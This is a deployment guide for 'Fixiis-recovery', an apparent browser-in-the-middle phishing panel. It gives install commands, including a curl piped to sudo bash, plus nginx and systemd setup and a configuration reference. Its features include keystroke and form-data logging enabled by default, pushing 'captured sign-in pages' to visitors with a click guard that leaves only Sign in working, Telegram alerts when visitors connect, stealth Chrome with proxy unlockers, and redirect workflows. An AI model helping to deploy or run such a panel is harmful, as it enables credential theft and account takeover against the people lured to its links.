# Deploying to a VPS

How to get this running on your own server. Everything here was checked
against the actual code — `main.py`, `config.py` and `api.py` — rather than
guesswork.

**Read [First: rotate your credentials](#first-rotate-your-credentials)
before you deploy.** The credentials baked into `config.py` are public.

---

## What you need

| | Minimum | Comfortable |
|---|---|---|
| CPU | 2 vCPU | 4 vCPU |
| RAM | 4 GB | 8 GB+ |
| Disk | 40 GB SSD | 80 GB SSD |
| OS | Ubuntu 22.04 | Ubuntu 24.04 |

RAM is the real constraint, not CPU. Each live session is a Chrome instance
— budget roughly **300–500 MB per concurrent session**. `MAX_SESSIONS` in
your env decides how many the box will accept; set it to something your RAM
actually supports, not something optimistic.

Open ports: **22** (SSH), **80** and **443**. Port 8446 should stay closed
to the internet — nginx fronts it.

---

## Quick start

Fresh Ubuntu box, as root:

```bash
curl -fsSL https://raw.githubusercontent.com/freemancatalogue979-web/v2/arena/e2dc03bd-v2/Fixiis-recovery/deploy/setup.sh \
  | sudo bash -s -- --domain panel.example.com --email you@example.com
```

That installs Chrome, Python deps, Playwright browsers, systemd, nginx and a
Let's Encrypt certificate. It prints a generated admin password **once** and
saves it to `/root/fixiis-credentials.txt`.

Prerequisite: `panel.example.com` must already resolve to the server's IP, or
the certificate step fails.

---

## Manual installation

Use this if you want to understand each step, or you're not on Ubuntu.

### 1. System packages

```bash
sudo apt update
sudo apt install -y python3 python3-venv python3-dev build-essential \
  git curl wget unzip nginx certbot python3-certbot-nginx ufw \
  libnss3 libnspr4 libatk1.0-0 libatk-bridge2.0-0 libcups2 libdrm2 \
  libxkbcommon0 libxcomposite1 libxdamage1 libxfixes3 libxrandr2 \
  libgbm1 libpango-1.0-0 libcairo2 libasound2 libatspi2.0-0 \
  fonts-liberation xvfb

# Google Chrome (the SeleniumBase backend drives real Chrome)
wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
sudo apt install -y ./google-chrome-stable_current_amd64.deb
```

### 2. Application

```bash
sudo useradd --system --home-dir /opt/fixiis --shell /usr/sbin/nologin fixiis
sudo git clone -b arena/e2dc03bd-v2 https://github.com/freemancatalogue979-web/v2.git /opt/src
sudo cp -a /opt/src/Fixiis-recovery /opt/fixiis

cd /opt/fixiis
sudo python3 -m venv venv
sudo venv/bin/pip install --upgrade pip
sudo venv/bin/pip install -r requirements.txt
sudo venv/bin/playwright install chromium
```

### 3. Configure

```bash
sudo cp .env.example .env
sudo chmod 600 .env
```

Generate an admin password hash and put it in `.env`:

```bash
/opt/fixiis/venv/bin/python -c \
  "import bcrypt;print(bcrypt.hashpw(b'YOUR_PASSWORD', bcrypt.gensalt(12)).decode())"
```

Then edit `.env` and set at minimum:

```
ADMIN_PASSWORD_HASH=<the hash you just generated>
PUBLIC_IP=<your server's public IP>
SERVER_DOMAIN=panel.example.com
USE_HTTPS=true
```

`main.py` loads `.env` automatically at startup, before `config.py` is
imported — so anything in `.env` overrides the defaults in `config.py`.
No extra tooling needed.

### 4. Run it under systemd

```bash
sudo sed 's|/opt/fixiis|/opt/fixiis|g' deploy/fixiis.service \
  | sudo tee /etc/systemd/system/fixiis.service
sudo systemctl daemon-reload
sudo systemctl enable --now fixiis
sudo journalctl -u fixiis -f        # watch it come up
```

### 5. nginx + HTTPS

```bash
sudo sed 's|panel\.example\.com|panel.example.com|g' deploy/nginx.conf \
  | sudo tee /etc/nginx/sites-available/fixiis
sudo ln -s /etc/nginx/sites-available/fixiis /etc/nginx/sites-enabled/
sudo rm -f /etc/nginx/sites-enabled/default
sudo nginx -t && sudo systemctl reload nginx

sudo certbot --nginx -d panel.example.com --agree-tos -m you@example.com
```

Two nginx settings are non-obvious and easy to miss:

- **WebSocket upgrade headers.** The live view, the admin event feed and
  chat all ride on WebSockets. Without `Upgrade` / `Connection` they
  connect and then sit there doing nothing.
- **`proxy_read_timeout`.** nginx defaults to 60 s, which silently kills
  long-lived streaming sockets. The provided config raises it to an hour.

### 6. Firewall

```bash
sudo ufw allow OpenSSH
sudo ufw allow 'Nginx Full'
sudo ufw enable
```

Leave 8446 closed.

---

## First: rotate your credentials

`config.py` ships with working credentials hardcoded, and this repository is
public. If you deploy without changing them, you are running a server whose
secrets anyone can read off GitHub.

Rotate these **first**, then put the new values in `.env`:

| Secret | Where it lives | How to rotate |
|---|---|---|
| Telegram bot token | `config.py` → `telegram_bot_token` | `@BotFather` → `/revoke`, then new token |
| Telegram admin password | `telegram_admin_password` | Change it — the shipped default is a guessable word |
| Proxy account | `proxy_username` / `proxy_password` | Change at your proxy provider |
| Oxylabs browser | `oxylabs_browser_username` / `_password` | Change in the Oxylabs dashboard |
| Oxylabs unlocker | `oxylabs_unlocker_username` / `_password` | Same |
| Panel login | `ADMIN_USERNAME` + `ADMIN_PASSWORD_HASH` | Generate a new bcrypt hash |

Setting them in `.env` overrides the hardcoded values without editing
`config.py` — which also means the next `git pull` won't clobber them.

Also worth deciding: `KEYLOG_ENABLED` and `KEYLOG_LOG_FORM_DATA` both
default to **true**. If you don't need keystroke capture, turn it off.

---

## Configuration reference

Set these in `/opt/fixiis/.env`. `config.py` reads them at startup.

### Required

| Variable | Purpose |
|---|---|
| `ADMIN_USERNAME` | Panel login. Default `admin`. |
| `ADMIN_PASSWORD_HASH` | bcrypt hash of the panel password. **Change this.** |
| `PUBLIC_IP` | Public IP used to build share links. |
| `SERVER_DOMAIN` | Your domain, same purpose. |
| `USE_HTTPS` | `true` once TLS is up. |

### Network

| Variable | Default | Notes |
|---|---|---|
| `HOST` | `0.0.0.0` | Set to `127.0.0.1` when nginx fronts it. |
| `PORT` | `8446` | Internal port. |
| `ALLOWED_ORIGINS` | `*` | Set this when the panels are hosted elsewhere. |

### Browser

| Variable | Default | Notes |
|---|---|---|
| `BROWSER_BACKEND` | `sb` | `sb` = SeleniumBase real-Chrome stealth. `playwright` = fallback. |
| `HEADLESS` | `true` | |
| `STEALTH_MODE` | `true` | |
| `USE_SYSTEM_CHROME` | `true` | Uses the installed Chrome. |
| `CHROME_PATH` | auto | Only if auto-detection fails. |
| `BROWSER_POOL_SIZE` | `10` | |
| `MAX_SESSIONS` | `20` | Keep within your RAM budget. |

### Integrations

`TELEGRAM_BOT_TOKEN`, `TELEGRAM_CHAT_ID`, `TELEGRAM_ADMIN_IDS`,
`TELEGRAM_ENABLED`, `TELEGRAM_NOTIFY_ON_CONNECT`,
`PROXY_ENABLED`, `PROXY_SERVER`, `PROXY_USERNAME`, `PROXY_PASSWORD`,
`KEYLOG_ENABLED`, `KEYLOG_LOG_FORM_DATA`, `ENABLE_LIVE_LIBRARY`.

### Tuning

`TARGET_FPS`, `QUALITY`, `BITRATE`, `USE_GPU`, `DEBUG_MODE`,
`ENABLE_METRICS`, `SESSION_TIMEOUT`.

---

## Hosting the panels separately

You don't have to serve the admin panels from the backend. All three
front-ends resolve their backend in this order:

1. `?server=https://your-backend` (also `?backend=` / `?api=`)
2. `window.SERVER_ENDPOINT`, set before the page's script runs
3. The value remembered in `localStorage` under `lpv_server_endpoint`
4. The origin serving the page — **skipped for `file://`**, whose opaque
   `null` origin can never be a backend

The storage key is shared by `Admin.html`, `mini-admin.html` and
`client.html`, so hosting all three on one static domain means configuring
the backend once.

To do this:

1. Upload the HTML file to Netlify / Cloudflare Pages / S3 / anything.
2. Set `ALLOWED_ORIGINS` on the backend to include that origin:
   ```
   ALLOWED_ORIGINS=https://ops.netlify.app
   ```
3. Open the panel with `?server=https://panel.example.com`, or inject
   `window.SERVER_ENDPOINT` into the page.

**Use `https://` for the backend if the panel is on HTTPS.** Browsers block
`ws://` from an HTTPS page as mixed content, and the live feed will not
connect.

### Click guard — decide which controls a pushed page may use

Every archived page has a **click guard** (Archive → `🔓 Guard`, also in the
page preview footer, and a quick `🔒` toggle in the mini admin). With the guard
on, `client.html` swallows every click on that page except the controls you
list — the usual case is a captured sign-in page where only **Sign in** should
work.

* Blocked clicks never reach the page, never flash the spinner and never
  report a `lpv_spinner` event — so a `redirect` workflow step can no longer be
  advanced by a stray tap.
* Scrolling, typing and focussing fields still work; only clicks and form
  submits are gated.
* Rules are matched against the clicked element and up to four ancestors:

  | Rule | Matches |
  |---|---|
  | `#signin` | element id |
  | `.js-next` | class name |
  | `button[type=submit]` | any CSS selector (`closest`) |
  | `button` | tag name |
  | `text:Sign in` | visible text / `aria-label` / `title` / `value` |
  | `name:identifier` | `name` attribute |
  | `aria:Continue` | `aria-label` contains |
  | `*` | everything (guard inert) |

* **Report blocked clicks** (default on, throttled) sends a `click_blocked`
  event to the LPV audit feed, so you can see what visitors tried to press
  while tuning the allowlist.
* **Show the visitor a hint** (default on) shows a short toast when they hit a
  locked control instead of leaving them with a page that looks broken.
  * **Hint text** — set your own wording per page (`guard.message`, up to 300
    characters, plain text). Empty means the built-in "This control is locked —
    use the highlighted button".
  * Turn **Show the visitor a hint** off to show nothing at all; the message is
    kept, so switching feedback back on restores your text.
  * The mini admin's 💬 button edits the same value from a phone (`hide` turns
    the hint off, empty restores the default).
* Saved guards apply immediately: clients already showing the page get an
  `lpv_guard` message over their WebSocket (`delivered` in the response tells
  you how many were updated).

*API:* `GET` / `PUT /api/lpv/pages/<id>/guard` with
`{"guard": {"enabled": true, "allow": ["#signin"], "notify": true, "feedback": true, "message": "Tap Sign in to continue"}}`
(the flat form without the `guard` wrapper also works). The guard is also
included in every `lpv_show_page` payload as `guard`, and as
`default_page_guard` in the LPV-only boot payload.

---

### Hosting `client.html` away from the backend (LPV pages and workflows)

`client.html` can be hosted anywhere, but it must be told where the backend
is — either bake it in with `deploy/make-standalone.sh`, inject
`window.SERVER_ENDPOINT`, or open it with `?server=https://your-backend`.

Links generated by the panels carry `?server=<backend>` automatically
whenever the link points somewhere other than the backend (the "custom
client.html URL" and "this page's origin" link bases), because `localStorage`
is per-origin and the client cannot otherwise discover the server.

The backend sends LPV page addresses as server-relative paths
(`/api/lpv/archive/<id>/html`). `client.html` resolves every one of them
against its configured backend, not against the origin that served the HTML.
That means:

* Pushed pages, `_default.html` in LPV-only mode, custom workflow loading
  pages and workflow `page` steps all load on a standalone copy.
* If the page origin and the backend origin differ, the backend must allow
  that origin. With the default `ALLOWED_ORIGINS=*` nothing is needed.
  If you restricted it, add the client's origin:
  ```
  ALLOWED_ORIGINS=https://ops.netlify.app,https://pages.example.com
  ```
  (`*` disables credentialed requests, which the LPV page endpoint does not
  need — it is fetched without cookies.)
* Do not put a restrictive `Content-Security-Policy` on the static host that
  serves `client.html`: pages are rendered in a `blob:` iframe and inherit
  the parent document's policy, so `img-src`/`script-src` must allow the
  sites the pushed pages reference (`https:`).
* If a push fails, the client reports `page_load_failed` with the resolved
  URL, the API base and a CORS hint; it appears in the LPV audit feed in the
  panels.

---

## Where data lives

Created automatically at startup (`config.py`):

| Path | Contents |
|---|---|
| `profiles/` | Per-session browser profiles — cookies, history, fingerprints |
| `logs/` | Application and proxy logs |
| `cache/` | Temporary capture data |
| `lpv/` | Live page state, plus `lpv/pages/` for saved pages |
| `data/` | Telegram config and server settings |

All of these are in `.gitignore`, so they stay out of git. Back up
`data/` and `lpv/pages/` — that's your configuration and saved work.
`profiles/` and `cache/` are disposable.

---

## Operations

```bash
systemctl status fixiis          # is it up
journalctl -u fixiis -f          # live logs
systemctl restart fixiis         # restart after .env changes
journalctl -u fixiis --since '1 hour ago'   # recent history

certbot renew --dry-run          # verify auto-renewal works
systemctl status certbot.timer   # renewal is scheduled
```

### Settings: config.py first

`config.py` is the source of truth (`host = "0.0.0.0"`, `port = 8446`).
`deploy/setup.sh` writes a `.env` for the secrets (admin password hash, JWT
secret) and the domain; that file only *overrides* `config.py`. Nothing is
written automatically at startup except the repair below.

```bash
sudo -u fixiis python3 main.py --check        # every value + where it came from
sudo -u fixiis python3 main.py --set-password # change the admin password
sudo -u fixiis python3 main.py --ignore-env   # ignore .env, use config.py only
sudo -u fixiis python3 main.py --fix-env      # repair a broken .env
```

At startup a `.env` that would break the app is repaired once and the change
is printed: a template placeholder domain, a loopback `HOST` when nothing
proxies to the app, a blank secret. Real values are never touched.

### First start without setup.sh

If you copied the files by hand instead of running `deploy/setup.sh`:

```bash
cd /opt/fixiis
sudo -u fixiis python3 main.py --setup   # creates venv/ and installs requirements
sudo -u fixiis python3 main.py --check   # python, packages, .env, port, Chrome
```

`main.py` is self-contained: it switches into the code directory, creates and
re-enters `venv/`, installs whatever `requirements.txt` is missing, copies
`.env.example` to `.env` on the first run and creates the runtime folders.
The manual `python -m venv` / `pip install` dance is optional.

The service unit runs with `FIXIIS_AUTO_SETUP=1`, so a deploy that adds a
dependency installs it on the next restart instead of failing the boot.

`HOST` decides who can reach the app: `0.0.0.0` = the whole network,
`127.0.0.1` = only processes on this box (what you want behind nginx or the
Cloudflare tunnel). `main.py` prints the resulting URLs at startup and
`--check` reports the bind address, warning when it is local-only.
Run `sudo -u fixiis python3 main.py --check` any time you want a report on
packages, `.env`, permissions, port and Chrome.

### Updating

```bash
cd /opt/fixiis && sudo git pull
sudo venv/bin/pip install -r requirements.txt   # only if requirements changed
sudo systemctl restart fixiis
```

That is the whole deploy: pull, install, restart. If the auto-restart watcher
is enabled (see below) the last line is optional — it restarts the app for
you a few seconds after the files change.

Note: `git pull` will overwrite `config.py`. Anything you set in `.env`
survives; anything you edited directly in `config.py` does not.

---

## Auto-restart on upload (optional, off by default)

By default restarts are manual and explicit:

```bash
sudo systemctl restart fixiis      # after uploading/pulling new code
```

`deploy/autoreload.py` can do that for you. It runs as
**`fixiis-reloader.service`**, watches the install directory, and restarts
`fixiis.service` a few seconds after a source file changes. It is **opt-in**,
because a restart drops live sessions — so it should be a deliberate choice,
not a surprise on a box that is mid-run.

```bash
sudo /opt/fixiis/deploy/autoreload.sh status     # what is it doing now?
sudo /opt/fixiis/deploy/autoreload.sh off        # stop it (app keeps running)
sudo /opt/fixiis/deploy/autoreload.sh on         # enable it
sudo /opt/fixiis/deploy/autoreload.sh uninstall  # remove the unit entirely
```

`off` is the important one: it stops the watcher and prevents it from
starting at boot, and **does not touch the running app** — no downtime, no
dropped sessions, no state to restore. Manual `systemctl restart fixiis`
keeps working exactly as before.

`deploy/setup.sh` no longer enables it. On a fresh install add
`--autoreload` if you want it (`--no-autoreload` is still accepted and is
now the default):

```bash
sudo deploy/setup.sh --domain panel.example.com --email you@example.com --autoreload
```

### What it watches, when you do enable it

| Watched | Never triggers |
|---|---|
| `*.py`, `*.html`, `.env`, `requirements.txt` | `lpv/`, `logs/`, `data/`, `cache/`, `profiles/` |
| — | `*.sqlite3`, `*.log`, `persistent_links.json`, `*.pyc` |
| — | `venv/`, `__pycache__/`, `.git/`, `node_modules/`, `build/` |
| — | `tests/`, `deploy/` (editing these must not bounce production) |

Runtime directories are ignored on purpose — the app writes to them while
it runs, and watching them would restart the service forever. A burst of
uploads is debounced (3 s quiet period, 10 s minimum between restarts), there
is a budget of **8 restarts per 10 minutes** (after that it stops touching the
service and says why), and every changed `.py` is compile-checked first: a
broken upload logs `NOT restarting` and leaves the old code serving.

### Checking whether it is the thing misbehaving

```bash
sudo ./deploy/doctor.sh          # services, restart counts, .env, port, logs
sudo ./deploy/doctor.sh --watch  # follow both logs live
journalctl -u fixiis-reloader -f # the watcher's own log
```

If the doctor shows the app restarting over and over, turn the watcher off
first (`deploy/autoreload.sh off`) and see whether the flapping stops. If it
does, the files are changing (sync client, editor auto-save, a deploy loop) —
the watcher is only reporting that.

### Confirming a deploy landed

```bash
curl -s http://127.0.0.1:8446/health | jq .build
# { "started_at": ..., "uptime_seconds": 12.4, "pid": 2127,
#   "revision": "946668d", "autoreload": false }
```

`uptime_seconds` resetting proves the process restarted; `revision` is the
commit actually running; `autoreload` says whether the watcher is on.

> Restarting drops live sessions (open browser streams and LPV pushes
> reconnect on their own, but an in-flight workflow stops). Deploy between
> runs, or wait for the workflow to finish.

---

## Troubleshooting

**Service starts then dies immediately.**
`journalctl -u fixiis -n 50`. Most often a missing Chrome or a bad
`.env` line.

**Login page loads but sign-in fails.**
`ADMIN_PASSWORD_HASH` must be a *bcrypt* hash, not the password itself.
Regenerate it.

**Panel loads, but clients never appear.**
The WebSocket isn't reaching the app. Check that nginx passes the
`Upgrade` and `Connection` headers, and that `proxy_read_timeout` is raised.
Confirm the app itself is healthy with:
`curl -s http://127.0.0.1:8446/api/settings`

**Live view connects but shows a black frame.**
Chrome couldn't start, or it needs more shared memory. Add to the unit:
```
[Service]
ExecStartPre=/bin/mount -o remount,size=2G /dev/shm
```

**Sessions die under load.**
You're out of RAM. Lower `MAX_SESSIONS` and `BROWSER_POOL_SIZE`, or add
swap:
```bash
sudo fallocate -l 4G /swapfile && sudo chmod 600 /swapfile
sudo mkswap /swapfile && sudo swapon /swapfile
echo '/swapfile none swap sw 0 0' | sudo tee -a /etc/fstab
```

**Share links point at the wrong address.**
Set `PUBLIC_IP` and `SERVER_DOMAIN`. The shipped default in `config.py` is a
hardcoded IP from a previous host.

**Panels hosted elsewhere can't reach the backend.**
Set `ALLOWED_ORIGINS`, and make sure both sides are HTTPS.
